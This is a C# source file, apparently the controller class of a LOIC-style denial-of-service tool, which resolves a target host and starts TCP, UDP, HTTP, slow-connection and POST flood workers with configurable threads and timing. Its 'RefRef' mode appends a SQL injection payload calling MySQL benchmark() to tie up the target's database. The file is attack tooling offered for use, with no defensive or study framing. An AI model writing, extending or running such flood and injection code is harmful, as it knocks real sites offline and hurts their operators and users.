using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Net;

namespace GAS.Core
{
    public enum AttackMethod
    {
        TCP,
        UDP,
        HTTP,
        ReCoil,
        SlowLOIC,
        RefRef,
        AhrDosme,
        Post
    }
    public class Manager
    {
        #region Attack info
        public int Timeout = 30, Threads = 10, SPT = 50, Port = 80, Delay = 0;
            public AttackMethod Method;
            public IPAddress Target = locolhaust;
            public bool WaitForResponse = false, AppendRANDOMChars = false, AppendRANDOMCharsUrl=false, UseGZIP = false, USEGet = false;
            public string Subsite = "/", DNSString=locolhaust.ToString();
        #endregion
        static IPAddress locolhaust = IPAddress.Parse("127.0.0.1");
        public IAttacker Worker;
        public string Data;
        public int Requested
        {
            get
            {
                return Worker.Requested;
            }
        }
        public int Failed
        {
            get
            {
                return Worker.Failed;
            }
        }
        public int Downloaded
        {
            get
            {
                return Worker.Downloaded;
            }
        }
        public bool LockOn(string host)
        {
            host = host.Trim().ToLower();
            if (IPAddress.TryParse(host, out Target))
            {
                DNSString = Target.ToString();
                return true;
            }
            else
            {
                try
                {
                    if (!host.StartsWith("http://") && !host.StartsWith("https://")) host = String.Concat("http://", host);
                    var trg = new Uri(host);
                    Target = Dns.GetHostEntry(trg.Host).AddressList[0];
                    DNSString = trg.Host;
                    Subsite = trg.PathAndQuery;
                    return true;
                }
                catch
                {
                    Target = locolhaust;
                    throw new Exception("Wrong HOST");
                }
            }
        }
        public void Stop()
        {
            if (Worker != null)
                Worker.Stop();
        }
        public void Start()
        {
            Stop();
            switch (Method)
            {
                case AttackMethod.HTTP:
                    Worker = new HTTPFlooder(DNSString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads);
                    break;
                case AttackMethod.ReCoil:
                    Worker = new ReCoil(DNSString, Target.ToString(), Port, Subsite, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, WaitForResponse, SPT, UseGZIP, Threads);
                    break;
                case AttackMethod.SlowLOIC:
                    Worker = new SlowLoic(DNSString, Target.ToString(), Port, Subsite, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, SPT, AppendRANDOMCharsUrl, USEGet, UseGZIP, Threads);
                    break;
                case AttackMethod.TCP:
                    Worker = new PacketFlood(Target.ToString(), Port, 1, Delay, WaitForResponse, Data, AppendRANDOMChars, Threads);
                    break;
                case AttackMethod.UDP:
                    Worker = new PacketFlood(Target.ToString(), Port, 2, Delay, WaitForResponse, Data, AppendRANDOMChars, Threads);
                    break;
                case AttackMethod.RefRef:
                    this.Subsite += " and (select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))".Replace(" ","%20");
                    Worker = new HTTPFlooder(DNSString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads);
                    break;
                case AttackMethod.AhrDosme:
                    Worker = new HTTPFlooder(DNSString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads,1);
                    break;
                case AttackMethod.Post:
                    Worker = new PostAttack(DNSString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads);
                    break;
                default :
                    throw new NotImplementedException("Code it yourself, lazy bastard");
            }
            Worker.Start();
        }
    }
}
